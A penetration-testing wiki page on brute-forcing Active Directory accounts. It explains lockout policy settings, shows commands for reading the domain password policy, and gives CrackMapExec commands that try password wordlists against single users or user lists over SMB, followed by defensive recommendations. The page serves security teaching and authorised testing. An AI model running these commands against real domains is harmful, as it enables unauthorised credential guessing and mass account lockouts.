---
layout: default
title: Brute-force
parent: Active Directory
nav_order: 2
permalink: /ad/bruteforce/
---

# Brute-force
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

{: .warning }
> This exploit can **lock** a large amount of - or even all - domain accounts. Be careful to **not perform to much attemps** on the same usernames or ensure to **know the enforced password policy** first.

## Vulnerability

Bruteforcing an Active Directory domain consist in trying a large amount of password for one or multiple usernames until finding legit credentials.

The main issue is that it is possible to enforce password policy on Active Directory, including following options which will be interesting for this exploit.

1. Reset Account Lockout Counter (minutes).
2. Account Lockout Threshold (number of attempts).

If option `2` is set to `None`, you can perform bruteforce without taking the risk to lock accounts. Otherwise, the account will be locked during the time stated by the option `1`, after have tried to authenticate on the same username the number of attempts stated by the option `2`.

## Exploit

First, you will need to know the password policy enforced on the domain to prevent any account lockout. If you already have a domain joined account, you can simply kindly ask.

```bash
# From Kali.
cme smb -d $DOMAIN -u $USERNAME -p $PASSWORD --pass-pol

# From a domain joined computer with ActiveDirectory PowerShell module.
Get-ADDefaultDomainPasswordPolicy

# From a domain joined computer with native PowerShell.
net accounts
```

If *Account Lockout Threshold* is set to `None`, prepare your wordlists. Otherwise, prefer doing [Password Spraying](/ad/spraying/).

```bash
# Try multiple passwords with the same username.
cme smb -d $DOMAIN -u $USERNAME -p passwords.txt

# Try multiple passwords for every username.
cme smb -d $DOMAIN -u usernames.txt -p passwords.txt
```

## Recommendations

- [ ] Use strong passwords that are not easily bruteforceable.
- [ ] Enfore strict password policies with account lockout threshold.
- [ ] Do not reuse passwords from a system to another.